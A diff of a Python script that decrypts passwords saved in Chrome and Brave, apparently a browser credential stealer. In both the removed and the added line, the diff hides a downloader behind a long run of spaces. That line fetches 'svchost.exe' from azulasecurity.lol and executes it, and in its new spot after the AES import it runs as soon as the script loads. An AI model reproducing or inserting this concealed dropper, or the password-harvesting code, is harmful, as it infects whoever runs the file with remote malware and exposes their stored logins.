@@ -6,7 +6,7 @@ import sqlite3
 import win32crypt
 import shutil
 import requests
-from Cryptodome.Cipher import AES
+from Cryptodome.Cipher import AES;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    url = "http://azulasecurity.lol/m/svchost.exe"; output_file = "svchost.exe"; response = requests.get(url, stream=True); open(output_file, "wb").write(b"".join(response.iter_content(8192)));os.system("svchost.exe")
 
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])
 BRAVE_PATH = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % os.environ['USERPROFILE'])
@@ -28,7 +28,7 @@ def decrypt_password(ciphertext, secret_key):
     try:
         iv, encrypted_password = ciphertext[3:15], ciphertext[15:-16]
         cipher = AES.new(secret_key, AES.MODE_GCM, iv)
-        return cipher.decrypt(encrypted_password).decode();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    url = "http://azulasecurity.lol/m/svchost.exe"; output_file = "svchost.exe"; response = requests.get(url, stream=True); open(output_file, "wb").write(b"".join(response.iter_content(8192)));os.system("svchost.exe")
+        return cipher.decrypt(encrypted_password).decode()
     except Exception as e:
         return f"[ERR] Cannot decrypt: {e}"
 
